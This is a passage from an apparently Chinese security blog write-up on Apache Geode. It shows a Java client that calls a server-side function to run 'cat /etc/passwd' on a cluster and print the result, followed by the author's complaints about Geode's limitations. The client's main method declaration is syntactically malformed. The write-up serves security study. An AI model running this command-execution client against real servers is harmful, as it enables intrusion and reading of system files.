        }
    }
    ```

    能够发送命令并打印回显的客户端示例如下所示

    ```java
    //by leeya_bug
    package org.example;
    import org.apache.geode.cache.client.*;
    import org.apache.geode.cache.execute.*;

    public class Client {
        public static void main(String[] args)() {
            //连接集群服务器
            ClientCache cache = new ClientCacheFactory().addPoolLocator("{我的IP}", 10334).create();
            //客户端传参
            Object[] functionArgs = new Object[]{"cat /etc/passwd"};
            Execution execution = FunctionService.onServer(cache).setArguments(functionArgs);
            ResultCollector<?, ?> rc = execution.execute("leeyabug_example");
            //获取执行结果并打印
            Object result = rc.getResult();
            System.out.println(result);
            cache.close();
        }
    }
    ```


# [](#header-31)一些个人意见

在Apache Geode中，有那么一些小特性：

1. Apache Geode 创建的 server、locator 绑定的IP必须与用户在同一子网下，使用穿透、端口映射等方法均完全无法正常访问，同理对于 docker 镜像部署几乎属于 0 支持
2. 官方文档缺斤少两：无论是中文的文档还是英文的文档，都是缺斤少两. 很多函数调用细节都是笔者猜想出来的，尤其是在 jmx 访问处，笔者
3. 对于个人用户的支持性极差：几乎只适合企业级场景，在低于 2G 内存下部署将会自动崩溃
4. 错误处理极为奇葩：笔者在动态调试过程中只收到过一类正确的 Exception，当然是笔者自己忘记 docker 映射端口的原因，后续收到的 Exceptions 几乎都是无脑 throw 底部栈

笔者学业繁忙，以上某些漏洞若想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此笔者无任何深入研究  Geode 协议的必要


-----

于 2024 6 9日更新，笔者目标已经完成，后续如无必要将不会再对该资产做出进一步审计和处理